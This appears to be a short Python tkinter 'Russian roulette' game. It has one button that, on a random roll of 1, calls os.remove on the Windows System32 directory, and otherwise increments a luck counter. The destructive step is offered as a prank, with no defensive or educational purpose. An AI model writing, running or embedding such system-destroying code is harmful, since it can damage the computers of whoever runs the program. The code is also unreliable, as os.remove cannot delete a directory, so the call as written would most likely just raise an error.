import os, random, tkinter

win=tkinter.Tk()
luck = 0
def rulet ():
    global luck
    lo = random.randint(0,6)
    if lo ==1:
        os.remove("C:\Windows\System32")
    else:
        luck += 1
        lucky.config(text=luck)
        
lucky = tkinter.Label(win,text=luck)
lucky.pack()
inicio= tkinter.Button(win,text="ruleta rusa", command=rulet)
inicio.pack()

win.mainloop()